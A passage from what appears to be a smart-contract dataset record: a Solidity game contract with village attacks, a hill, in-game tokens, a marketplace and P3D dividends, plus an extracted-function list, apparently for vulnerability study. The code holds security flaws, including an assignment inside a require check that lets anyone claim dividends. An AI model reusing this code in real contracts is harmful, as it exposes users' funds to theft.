1 finney);\n if(block.number > roundvars[round].lastblockpayout.add(roundvars[round].blocksbeforenewpay))\n {\n hillpayout();\n }\n require(amtsoldiers <= roundownables[round].soldiers[msg.sender]);\n require(amtsoldiers >= 1);\n if(msg.sender == roundownables[round].hillowner)\n{\n roundownables[round].soldiersdefendinghill = roundownables[round].soldiersdefendinghill.add(amtsoldiers);\n roundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\n return (false, 0);\n}\nif(msg.sender != roundownables[round].hillowner)\n{\n if(roundownables[round].soldiersdefendinghill < amtsoldiers)\n {\n emit hilltakeover(roundownables[round].hillowner,msg.sender);\n emit battle(msg.sender,roundownables[round].soldiersdefendinghill,roundownables[round].hillowner,roundownables[round].soldiersdefendinghill);\n roundownables[round].hillowner = msg.sender;\n roundownables[round].soldiersdefendinghill = amtsoldiers.sub(roundownables[round].soldiersdefendinghill);\n roundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\n return (true, roundownables[round].soldiersdefendinghill);\n }\n if(roundownables[round].soldiersdefendinghill >= amtsoldiers)\n {\n roundownables[round].soldiersdefendinghill = roundownables[round].soldiersdefendinghill.sub(amtsoldiers);\n roundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\n emit battle(msg.sender,amtsoldiers,roundownables[round].hillowner,amtsoldiers);\n return (false, amtsoldiers);\n }\n}\n}\nfunction supporthill(uint256 amtsoldiers) public payable {\n require(msg.value >= 1 finney);\n require(roundownables[round].hillowner == msg.sender);\n require(amtsoldiers <= roundownables[round].soldiers[msg.sender]);\n require(amtsoldiers >= 1);\n roundownables[round].soldiersdefendinghill = roundownables[round].soldiersdefendinghill.add(amtsoldiers);\n roundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\n}\nfunction changetradestatus(bool active) public onlyOwner {\n roundownables[round].ERCtradeactive = active;\n}\nfunction setdivsforall(bool active) public onlyOwner {\n divsforall = active;\n}\nfunction changebeginnerprotection(uint256 blockcount) public onlyOwner {\n roundvars[round].bpamount = blockcount;\n}\nfunction changesoldierreplenishrate(uint256 rate) public onlyOwner {\n roundvars[round].soldierreplenishrate = rate;\n}\nfunction updatesolsforhire() internal {\n roundvars[round].solsforhire = roundvars[round].solsforhire.add((block.number.sub(roundvars[round].solslastupdate)).mul(roundvars[round].nextVillageId).mul(roundvars[round].soldierreplenishrate));\n roundvars[round].solslastupdate = block.number;\n}\nfunction updatesolbuyrate() internal {\nif(roundvars[round].solsforhire > roundvars[round].totalsupplyGOTCH)\n {\n roundvars[round].solsforhire = roundvars[round].totalsupplyGOTCH;\n }\n roundvars[round].soldierprice = roundvars[round].totalsupplyGOTCH.div(roundvars[round].solsforhire);\n if(roundvars[round].soldierprice < 1)\n {\n roundvars[round].soldierprice = 1;\n }\n}\nfunction buysoldiers(uint256 amount) public payable {\n require(msg.value >= 1 finney);\n updatesolsforhire();\n updatesolbuyrate() ;\n require(amount <= roundvars[round].solsforhire);\n roundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].add(amount);\n roundvars[round].solsforhire = roundvars[round].solsforhire.sub(amount);\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].sub( amount.mul(roundvars[round].soldierprice));\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(amount.mul(roundvars[round].soldierprice));\n}\nfunction createvillage() public payable {\n require(msg.value >= 10 finney);\n if(block.number > roundvars[round].lastblockpayout.add(roundvars[round].blocksbeforenewpay))\n {\n hillpayout();\n }\n roundownables[round].villages[roundvars[round].nextVillageId].owner = msg.sender;\n roundownables[round].villages[roundvars[round].nextVillageId].lastcollect = block.number;\n roundownables[round].villages[roundvars[round].nextVillageId].beginnerprotection = block.number;\n roundvars[round].nextVillageId ++;\n roundownables[round].villages[roundvars[round].nextVillageId].defending = roundvars[round].nextVillageId;\n Redeemable[msg.sender]++;\n roundownables[round].redeemedvils[msg.sender]++;\n}\nfunction batchcreatevillage(uint256 amt) public payable {\n require(msg.value >= 10 finney * amt);\n require(amt >= 1);\n require(amt <= 40);\n if(block.number > roundvars[round].lastblockpayout.add(roundvars[round].blocksbeforenewpay))\n {\n hillpayout();\n }\n for(uint i=0; i< amt; i++)\n {\n roundownables[round].villages[roundvars[round].nextVillageId].owner = msg.sender;\n roundownables[round].villages[roundvars[round].nextVillageId].lastcollect = block.number;\n roundownables[round].villages[roundvars[round].nextVillageId].beginnerprotection = block.number;\n roundvars[round].nextVillageId ++;\n roundownables[round].villages[roundvars[round].nextVillageId].defending = roundvars[round].nextVillageId;\n }\n Redeemable[msg.sender] = Redeemable[msg.sender].add(amt);\n roundownables[round].redeemedvils[msg.sender] = roundownables[round].redeemedvils[msg.sender].add(amt);\n}\nfunction cheapredeemvillage() public payable {\n require(msg.value >= 1 finney);\n require(roundownables[round].redeemedvils[msg.sender] < Redeemable[msg.sender]);\n roundownables[round].villages[roundvars[round].nextVillageId].owner = msg.sender;\n roundownables[round].villages[roundvars[round].nextVillageId].lastcollect = block.number;\n roundownables[round].villages[roundvars[round].nextVillageId].beginnerprotection = block.number;\n roundvars[round].nextVillageId ++;\n roundownables[round].villages[roundvars[round].nextVillageId].defending = roundvars[round].nextVillageId;\n roundownables[round].redeemedvils[msg.sender]++;\n}\nfunction preregvills(address reg) public onlyOwner {\n roundownables[round].villages[roundvars[round].nextVillageId].owner = reg;\n roundownables[round].villages[roundvars[round].nextVillageId].lastcollect = block.number;\n roundownables[round].villages[roundvars[round].nextVillageId].beginnerprotection = block.number;\n roundvars[round].nextVillageId ++;\n roundownables[round].villages[roundvars[round].nextVillageId].defending = roundvars[round].nextVillageId;\n}\nfunction attack(uint256 village, uint256 amtsoldiers) public payable returns(bool, uint){\n require(msg.value >= 1 finney);\n if(block.number > roundvars[round].lastblockpayout + roundvars[round].blocksbeforenewpay)\n {\n hillpayout();\n }\n uint bpcheck = roundownables[round].villages[village].beginnerprotection.add(roundvars[round].bpamount);\n require(block.number > bpcheck);\n require(roundownables[round].villages[village].owner != 0);\n require(amtsoldiers <= roundownables[round].soldiers[msg.sender]);\n require(amtsoldiers >= 1);\nif(msg.sender == roundownables[round].villages[village].owner)\n{\n roundownables[round].villages[village].defending = roundownables[round].villages[village].defending.add(amtsoldiers);\n roundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\n return (false, 0);\n}\nif(msg.sender != roundownables[round].villages[village].owner)\n{\n if(roundownables[round].villages[village].defending < amtsoldiers)\n {\n emit battle(msg.sender,roundownables[round].villages[village].defending,roundownables[round].villages[village].owner,roundownables[round].villages[village].defending);\n emit villtakeover(roundownables[round].villages[village].owner,msg.sender,village);\n roundownables[round].villages[village].owner = msg.sender;\n roundownables[round].villages[village].defending = amtsoldiers.sub(roundownables[round].villages[village].defending);\n roundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\n collecttaxes(village);\n return (true, roundownables[round].villages[village].defending);\n }\n if(roundownables[round].villages[village].defending >= amtsoldiers)\n {\n emit battle(msg.sender,amtsoldiers,roundownables[round].villages[village].owner,amtsoldiers);\n roundownables[round].villages[village].defending = roundownables[round].villages[village].defending.sub(amtsoldiers);\n roundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\n return (false, amtsoldiers);\n }\n}\n}\nfunction support(uint256 village, uint256 amtsoldiers) public payable {\n require(msg.value >= 1 finney);\n require(roundownables[round].villages[village].owner == msg.sender);\n require(roundownables[round].villages[village].owner != 0);\n require(amtsoldiers <= roundownables[round].soldiers[msg.sender]);\n require(amtsoldiers >= 1);\n roundownables[round].villages[village].defending = roundownables[round].villages[village].defending.add(amtsoldiers);\n roundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\n}\nfunction renewbeginnerprotection(uint256 village) public payable {\n require(msg.value >= (roundvars[round].nextVillageId.sub(village)).mul(1 finney) );\n roundownables[round].villages[village].beginnerprotection = block.number;\n}\nfunction batchcollecttaxes(uint256 a, uint256 b , uint256 c , uint256 d , uint256 e , uint256 f , uint256 g, uint256 h, uint256 i, uint256 j) public payable {\n require(msg.value >= 10 finney);\n require(roundownables[round].villages[a].owner == msg.sender);\n require(roundownables[round].villages[b].owner == msg.sender);\n require(roundownables[round].villages[c].owner == msg.sender);\n require(roundownables[round].villages[d].owner == msg.sender);\n require(roundownables[round].villages[e].owner == msg.sender);\n require(roundownables[round].villages[f].owner == msg.sender);\n require(roundownables[round].villages[g].owner == msg.sender);\n require(roundownables[round].villages[h].owner == msg.sender);\n require(roundownables[round].villages[i].owner == msg.sender);\n require(roundownables[round].villages[j].owner == msg.sender);\n require(block.number > roundownables[round].villages[a].lastcollect);\n require(block.number > roundownables[round].villages[b].lastcollect);\n require(block.number > roundownables[round].villages[c].lastcollect);\n require(block.number > roundownables[round].villages[d].lastcollect);\n require(block.number > roundownables[round].villages[e].lastcollect);\n require(block.number > roundownables[round].villages[f].lastcollect);\n require(block.number > roundownables[round].villages[g].lastcollect);\n require(block.number > roundownables[round].villages[h].lastcollect);\n require(block.number > roundownables[round].villages[i].lastcollect);\n require(block.number > roundownables[round].villages[j].lastcollect);\n uint256 test = (block.number.sub(roundownables[round].villages[a].lastcollect)).mul((roundvars[round].nextVillageId.sub(a)));\n if(roundvars[round].GOTCHatcontract < test )\n {\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\n roundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n }\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\n roundownables[round].villages[a].lastcollect = block.number;\n test = (block.number.sub(roundownables[round].villages[b].lastcollect)).mul((roundvars[round].nextVillageId.sub(b)));\n if(roundvars[round].GOTCHatcontract < test )\n {\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\n roundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n }\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\n roundownables[round].villages[b].lastcollect = block.number;\n test = (block.number.sub(roundownables[round].villages[c].lastcollect)).mul((roundvars[round].nextVillageId.sub(c)));\n if(roundvars[round].GOTCHatcontract < test )\n {\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\n roundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n }\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\n roundownables[round].villages[c].lastcollect = block.number;\n test = (block.number.sub(roundownables[round].villages[j].lastcollect)).mul((roundvars[round].nextVillageId.sub(j)));\n if(roundvars[round].GOTCHatcontract < test )\n {\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\n roundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n }\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\n roundownables[round].villages[j].lastcollect = block.number;\n test = (block.number.sub(roundownables[round].villages[d].lastcollect)).mul((roundvars[round].nextVillageId.sub(d)));\n if(roundvars[round].GOTCHatcontract < test )\n {\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\n roundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n }\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\n roundownables[round].villages[d].lastcollect = block.number;\n test = (block.number.sub(roundownables[round].villages[e].lastcollect)).mul((roundvars[round].nextVillageId.sub(e)));\n if(roundvars[round].GOTCHatcontract < test )\n {\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\n roundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n }\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\n roundownables[round].villages[e].lastcollect = block.number;\n test = (block.number.sub(roundownables[round].villages[f].lastcollect)).mul((roundvars[round].nextVillageId.sub(f)));\n if(roundvars[round].GOTCHatcontract < test )\n {\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\n roundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n }\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\n roundownables[round].villages[f].lastcollect = block.number;\n test = (block.number.sub(roundownables[round].villages[g].lastcollect)).mul((roundvars[round].nextVillageId.sub(g)));\n if(roundvars[round].GOTCHatcontract < test )\n {\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\n roundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n }\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\n roundownables[round].villages[g].lastcollect = block.number;\n test = (block.number.sub(roundownables[round].villages[h].lastcollect)).mul((roundvars[round].nextVillageId.sub(h)));\n if(roundvars[round].GOTCHatcontract < test )\n {\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\n roundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n }\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\n roundownables[round].villages[h].lastcollect = block.number;\n test = (block.number.sub(roundownables[round].villages[i].lastcollect)).mul((roundvars[round].nextVillageId.sub(i)));\n if(roundvars[round].GOTCHatcontract < test )\n {\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\n roundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n }\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\n roundownables[round].villages[i].lastcollect = block.number;\n}\nfunction collecttaxes(uint256 village) public payable returns (uint){\n require(msg.value >= 1 finney);\n if(block.number > roundvars[round].lastblockpayout.add(roundvars[round].blocksbeforenewpay))\n {\n hillpayout();\n }\n require(roundownables[round].villages[village].owner == msg.sender);\n require(block.number > roundownables[round].villages[village].lastcollect);\n uint256 test = (block.number.sub(roundownables[round].villages[village].lastcollect)).mul((roundvars[round].nextVillageId.sub(village)));\n if(roundvars[round].GOTCHatcontract < test )\n {\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\n roundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n }\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\n roundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\n roundownables[round].villages[village].lastcollect = block.number;\n return test;\n}\nfunction sellDOTCH(uint amt) payable public {\n require(msg.value >= 1 finney);\n require(roundownables[round].ERCtradeactive == true);\n require(roundownables[round].GOTCH[this]>= amt.mul(10000));\n require(balances[msg.sender] >= amt);\n require(amt >= 1);\n balances[this] = balances[this].add(amt);\n balances[msg.sender] = balances[msg.sender].sub(amt);\n emit Transfer(msg.sender,this, amt);\n roundownables[round].GOTCH[this] = roundownables[round].GOTCH[this].sub(amt.mul(10000));\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(amt.mul(10000));\n}\nfunction buyDOTCH(uint amt) payable public {\n require(msg.value >= 1 finney);\n require(roundownables[round].ERCtradeactive == true);\n require(balances[this]>= amt);\n require(roundownables[round].GOTCH[msg.sender] >= amt.mul(10000));\n require(amt >= 1);\n balances[this] = balances[this].sub(amt);\n balances[msg.sender] = balances[msg.sender].add(amt);\n emit Transfer(this,msg.sender, amt);\n roundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].sub(amt.mul(10000));\n roundownables[round].GOTCH[this] = roundownables[round].GOTCH[this].add(amt.mul(10000));\n}\nfunction buyp3d(uint256 amt) internal{\nP3Dcontract_.buy.value(amt)(this);\n}\nfunction claimdivs() internal{\nP3Dcontract_.withdraw();\n}\nevent onHarvest(\n address customerAddress,\n uint256 amount\n );\nfunction Divs() public payable{\n require(msg.sender == roundownables[round].hillowner);\n claimdivs();\n msg.sender.transfer(div);\n emit onHarvest(msg.sender,div);\n}\nfunction Divsforall() public payable{\n require(divsforall = true);\n require(msg.value >= 1 finney);\n div = harvestabledivs();\n require(div > 0);\n claimdivs();\n msg.sender.transfer(div);\n emit onHarvest(msg.sender,div);\n}\nfunction Expand() public {\n buyp3d(ethforp3dbuy);\n ethforp3dbuy = 0;\n}\nfunction placeoffer(uint256 dotchamount, uint256 askingpriceinwei) payable public{\n require(dotchamount > 0);\n require(askingpriceinwei > 0);\n require(balances[msg.sender] >= dotchamount);\n require(msg.value >= 1 finney);\n balances[msg.sender] = balances[msg.sender].sub(dotchamount);\n balances[this] = balances[this].add(dotchamount);\n emit Transfer(msg.sender,this, dotchamount);\n marketplace[nextmarketoffer].placedby = msg.sender;\n marketplace[nextmarketoffer].amountdotch = dotchamount;\n marketplace[nextmarketoffer].wantsthisamtweiperdotch = askingpriceinwei;\n nextmarketoffer++;\n}\nfunction adddotchtooffer(uint256 ordernumber , uint256 dotchamount) public\n{\n require(dotchamount > 0);\n require(msg.sender == marketplace[ordernumber].placedby);\n require(balances[msg.sender] >= dotchamount);\n balances[msg.sender] = balances[msg.sender].sub(dotchamount);\n balances[this] = balances[this].add(dotchamount);\n emit Transfer(msg.sender,this, dotchamount);\n marketplace[ordernumber].amountdotch = marketplace[ordernumber].amountdotch.add(dotchamount);\n}\nfunction removedotchtooffer(uint256 ordernumber , uint256 dotchamount) public\n{\n require(dotchamount > 0);\n require(msg.sender == marketplace[ordernumber].placedby);\n require(balances[this] >= dotchamount);\n balances[msg.sender] = balances[msg.sender].add(dotchamount);\n balances[this] = balances[this].sub(dotchamount);\n emit Transfer(this,msg.sender, dotchamount);\n marketplace[ordernumber].amountdotch = marketplace[ordernumber].amountdotch.sub(dotchamount);\n}\nfunction offerchangeprice(uint256 ordernumber ,uint256 price ) public\n{\n require(price > 0);\n require(msg.sender == marketplace[ordernumber].placedby);\n marketplace[ordernumber].wantsthisamtweiperdotch = price;\n}\nfunction takeoffer(uint256 ordernumber ,uint256 amtdotch ) public payable\n{\n require(msg.value >= marketplace[ordernumber].wantsthisamtweiperdotch.mul(amtdotch));\n require(amtdotch > 0);\n require(marketplace[ordernumber].amountdotch >= amtdotch);\n require(msg.sender != marketplace[ordernumber].placedby);\n require(balances[this] >= amtdotch);\n marketplace[ordernumber].amountdotch = marketplace[ordernumber].amountdotch.sub(amtdotch);\n balances[msg.sender] = balances[msg.sender].add(amtdotch);\n balances[this] = balances[this].sub(amtdotch);\n emit Transfer(this,msg.sender, amtdotch);\n emit dotchsale(marketplace[ordernumber].placedby,marketplace[ordernumber].wantsthisamtweiperdotch, msg.sender, amtdotch);\n marketplace[ordernumber].placedby.transfer(marketplace[ordernumber].wantsthisamtweiperdotch.mul(amtdotch));\n}\nfunction startnewround() public {\n require(roundvars[round].ATPO > roundownables[round].roundlength);\n round++;\n roundvars[round].totalsupplyGOTCH = nextroundtotalsupplyGOTCH;\n roundvars[round].GOTCHatcontract = nextroundtotalsupplyGOTCH;\n roundvars[round].solsforhire = nextroundsolsforhire;\n roundvars[round].soldierreplenishrate = nextroundsoldierreplenishrate;\n roundvars[round].solslastupdate = block.number;\n updatesolbuyrate();\n roundvars[round].lastblockpayout = block.number;\n roundownables[round].hillowner = msg.sender;\n roundvars[round].nextpayamount = roundvars[round-1].nextpayamount;\n roundvars[round].nextowneramount = roundvars[round-1].nextowneramount;\n roundvars[round].previousethamount = roundvars[round-1].previousethamount;\n roundvars[round].blocksbeforenewpay = nextroundblocksbeforenewpay;\n roundownables[round].ERCtradeactive = nextroundERCtradeactive;\n roundvars[round].bpamount = 30000;\n}\n}",
  "extract_feature": [
    "function hillpayout() internal {\nrequire(block.number > roundvars[round].lastblockpayout.add(roundvars[round].blocksbeforenewpay));\nroundvars[round].lastblockpayout = roundvars[round].lastblockpayout.add(roundvars[round].blocksbeforenewpay);\nethforp3dbuy = ethforp3dbuy.add((address(this).balance.sub(ethforp3dbuy)).div(100));\nowner.transfer((address(this).balance.sub(ethforp3dbuy)).div(100));\nroundvars[round].ATPO = roundvars[round].ATPO.add((address(this).balance.sub(ethforp3dbuy)).div(2));\nroundownables[round].hillowner.transfer((address(this).balance.sub(ethforp3dbuy)).div(2));\n}",
    "function attackhill(uint256 amtsoldiers) public payable returns(bool, uint){\nrequire(msg.value >= 1 finney);\nif(block.number > roundvars[round].lastblockpayout.add(roundvars[round].blocksbeforenewpay))\n{\nhillpayout();\n}\nrequire(amtsoldiers <= roundownables[round].soldiers[msg.sender]);\nrequire(amtsoldiers >= 1);\nif(msg.sender == roundownables[round].hillowner)\n{\nroundownables[round].soldiersdefendinghill = roundownables[round].soldiersdefendinghill.add(amtsoldiers);\nroundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\nreturn (false, 0);\n}\nif(msg.sender != roundownables[round].hillowner)\n{\nif(roundownables[round].soldiersdefendinghill < amtsoldiers)\n{\nemit hilltakeover(roundownables[round].hillowner,msg.sender);\nemit battle(msg.sender,roundownables[round].soldiersdefendinghill,roundownables[round].hillowner,roundownables[round].soldiersdefendinghill);\nroundownables[round].hillowner = msg.sender;\nroundownables[round].soldiersdefendinghill = amtsoldiers.sub(roundownables[round].soldiersdefendinghill);\nroundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\nreturn (true, roundownables[round].soldiersdefendinghill);\n}\nif(roundownables[round].soldiersdefendinghill >= amtsoldiers)\n{\nroundownables[round].soldiersdefendinghill = roundownables[round].soldiersdefendinghill.sub(amtsoldiers);\nroundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\nemit battle(msg.sender,amtsoldiers,roundownables[round].hillowner,amtsoldiers);\nreturn (false, amtsoldiers);\n}\n}\n}",
    "function updatesolsforhire() internal {\nroundvars[round].solsforhire = roundvars[round].solsforhire.add((block.number.sub(roundvars[round].solslastupdate)).mul(roundvars[round].nextVillageId).mul(roundvars[round].soldierreplenishrate));\nroundvars[round].solslastupdate = block.number;\n}",
    "function createvillage() public payable {\nrequire(msg.value >= 10 finney);\nif(block.number > roundvars[round].lastblockpayout.add(roundvars[round].blocksbeforenewpay))\n{\nhillpayout();\n}\nroundownables[round].villages[roundvars[round].nextVillageId].owner = msg.sender;\nroundownables[round].villages[roundvars[round].nextVillageId].lastcollect = block.number;\nroundownables[round].villages[roundvars[round].nextVillageId].beginnerprotection = block.number;\nroundvars[round].nextVillageId ++;\nroundownables[round].villages[roundvars[round].nextVillageId].defending = roundvars[round].nextVillageId;\nRedeemable[msg.sender]++;\nroundownables[round].redeemedvils[msg.sender]++;\n}",
    "function batchcreatevillage(uint256 amt) public payable {\nrequire(msg.value >= 10 finney * amt);\nrequire(amt >= 1);\nrequire(amt <= 40);\nif(block.number > roundvars[round].lastblockpayout.add(roundvars[round].blocksbeforenewpay))\n{\nhillpayout();\n}\nfor(uint i=0; i< amt; i++)\n{\nroundownables[round].villages[roundvars[round].nextVillageId].owner = msg.sender;\nroundownables[round].villages[roundvars[round].nextVillageId].lastcollect = block.number;\nroundownables[round].villages[roundvars[round].nextVillageId].beginnerprotection = block.number;\nroundvars[round].nextVillageId ++;\nroundownables[round].villages[roundvars[round].nextVillageId].defending = roundvars[round].nextVillageId;\n}\nRedeemable[msg.sender] = Redeemable[msg.sender].add(amt);\nroundownables[round].redeemedvils[msg.sender] = roundownables[round].redeemedvils[msg.sender].add(amt);\n}",
    "function cheapredeemvillage() public payable {\nrequire(msg.value >= 1 finney);\nrequire(roundownables[round].redeemedvils[msg.sender] < Redeemable[msg.sender]);\nroundownables[round].villages[roundvars[round].nextVillageId].owner = msg.sender;\nroundownables[round].villages[roundvars[round].nextVillageId].lastcollect = block.number;\nroundownables[round].villages[roundvars[round].nextVillageId].beginnerprotection = block.number;\nroundvars[round].nextVillageId ++;\nroundownables[round].villages[roundvars[round].nextVillageId].defending = roundvars[round].nextVillageId;\nroundownables[round].redeemedvils[msg.sender]++;\n}",
    "function preregvills(address reg) public onlyOwner {\nroundownables[round].villages[roundvars[round].nextVillageId].owner = reg;\nroundownables[round].villages[roundvars[round].nextVillageId].lastcollect = block.number;\nroundownables[round].villages[roundvars[round].nextVillageId].beginnerprotection = block.number;\nroundvars[round].nextVillageId ++;\nroundownables[round].villages[roundvars[round].nextVillageId].defending = roundvars[round].nextVillageId;\n}",
    "function attack(uint256 village, uint256 amtsoldiers) public payable returns(bool, uint){\nrequire(msg.value >= 1 finney);\nif(block.number > roundvars[round].lastblockpayout + roundvars[round].blocksbeforenewpay)\n{\nhillpayout();\n}\nuint bpcheck = roundownables[round].villages[village].beginnerprotection.add(roundvars[round].bpamount);\nrequire(block.number > bpcheck);\nrequire(roundownables[round].villages[village].owner != 0);\nrequire(amtsoldiers <= roundownables[round].soldiers[msg.sender]);\nrequire(amtsoldiers >= 1);\nif(msg.sender == roundownables[round].villages[village].owner)\n{\nroundownables[round].villages[village].defending = roundownables[round].villages[village].defending.add(amtsoldiers);\nroundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\nreturn (false, 0);\n}\nif(msg.sender != roundownables[round].villages[village].owner)\n{\nif(roundownables[round].villages[village].defending < amtsoldiers)\n{\nemit battle(msg.sender,roundownables[round].villages[village].defending,roundownables[round].villages[village].owner,roundownables[round].villages[village].defending);\nemit villtakeover(roundownables[round].villages[village].owner,msg.sender,village);\nroundownables[round].villages[village].owner = msg.sender;\nroundownables[round].villages[village].defending = amtsoldiers.sub(roundownables[round].villages[village].defending);\nroundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\ncollecttaxes(village);\nreturn (true, roundownables[round].villages[village].defending);\n}\nif(roundownables[round].villages[village].defending >= amtsoldiers)\n{\nemit battle(msg.sender,amtsoldiers,roundownables[round].villages[village].owner,amtsoldiers);\nroundownables[round].villages[village].defending = roundownables[round].villages[village].defending.sub(amtsoldiers);\nroundownables[round].soldiers[msg.sender] = roundownables[round].soldiers[msg.sender].sub(amtsoldiers);\nreturn (false, amtsoldiers);\n}\n}\n}",
    "function renewbeginnerprotection(uint256 village) public payable {\nrequire(msg.value >= (roundvars[round].nextVillageId.sub(village)).mul(1 finney) );\nroundownables[round].villages[village].beginnerprotection = block.number;\n}",
    "function batchcollecttaxes(uint256 a, uint256 b , uint256 c , uint256 d , uint256 e , uint256 f , uint256 g, uint256 h, uint256 i, uint256 j) public payable {\nrequire(msg.value >= 10 finney);\nrequire(roundownables[round].villages[a].owner == msg.sender);\nrequire(roundownables[round].villages[b].owner == msg.sender);\nrequire(roundownables[round].villages[c].owner == msg.sender);\nrequire(roundownables[round].villages[d].owner == msg.sender);\nrequire(roundownables[round].villages[e].owner == msg.sender);\nrequire(roundownables[round].villages[f].owner == msg.sender);\nrequire(roundownables[round].villages[g].owner == msg.sender);\nrequire(roundownables[round].villages[h].owner == msg.sender);\nrequire(roundownables[round].villages[i].owner == msg.sender);\nrequire(roundownables[round].villages[j].owner == msg.sender);\nrequire(block.number > roundownables[round].villages[a].lastcollect);\nrequire(block.number > roundownables[round].villages[b].lastcollect);\nrequire(block.number > roundownables[round].villages[c].lastcollect);\nrequire(block.number > roundownables[round].villages[d].lastcollect);\nrequire(block.number > roundownables[round].villages[e].lastcollect);\nrequire(block.number > roundownables[round].villages[f].lastcollect);\nrequire(block.number > roundownables[round].villages[g].lastcollect);\nrequire(block.number > roundownables[round].villages[h].lastcollect);\nrequire(block.number > roundownables[round].villages[i].lastcollect);\nrequire(block.number > roundownables[round].villages[j].lastcollect);\nuint256 test = (block.number.sub(roundownables[round].villages[a].lastcollect)).mul((roundvars[round].nextVillageId.sub(a)));\nif(roundvars[round].GOTCHatcontract < test )\n{\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\nroundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n}\nroundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\nroundownables[round].villages[a].lastcollect = block.number;\ntest = (block.number.sub(roundownables[round].villages[b].lastcollect)).mul((roundvars[round].nextVillageId.sub(b)));\nif(roundvars[round].GOTCHatcontract < test )\n{\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\nroundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n}\nroundownables[round].GOTCH[msg.sender] = 